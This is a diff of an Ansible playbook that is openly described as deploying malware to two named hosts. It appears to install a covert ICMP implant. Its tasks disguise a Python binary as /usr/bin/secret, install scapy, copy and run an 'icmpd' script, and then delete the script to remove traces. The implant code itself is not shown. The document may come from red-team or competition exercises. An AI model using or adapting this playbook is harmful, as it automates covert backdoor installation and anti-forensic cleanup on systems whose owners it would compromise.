@@ -2,13 +2,18 @@
 # This is an example task
 # add your tasks to deploy your malware here
 
-- name: PipDownload | Run | Run on Linux 
-  shell: "apt-get install pip"
+
+- name: Obsfucate | Run | Run on Linux 
+  shell: "cp /usr/bin/python3 /usr/bin/secret"
   when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
 
-- name: Install bottle python package
-  ansible.builtin.pip:
-    name: scapy
+- name: PipArchDownload | Run | Run on Linux 
+  shell: "python3 -m ensurepip --upgrade"
+  when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
+
+- name: ScapyDownload | Run | Run on Linux 
+  shell: "pip3 install scapy"
+  when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
 
 - name: icupClientDeploy | Copy file | Adds icup client
   copy:
@@ -31,10 +36,14 @@
     mode: 0555
   when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
 
+- name: CarriageReturnFix | Run | Run on Linux 
+  shell: "sed -i -e 's/\r$//' /etc/icmpd"
+  when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
+
 - name: RunScript | Run | Run on Linux 
-  shell: "./home/icmpd.sh"
+  shell: bash "/home/icmpd.sh"
   when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
 
 - name: DeleteScript | Run | Run on Linux 
-  shell: "./home/icmpd.sh"
+  shell: "rm /home/icmpd.sh"
   when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
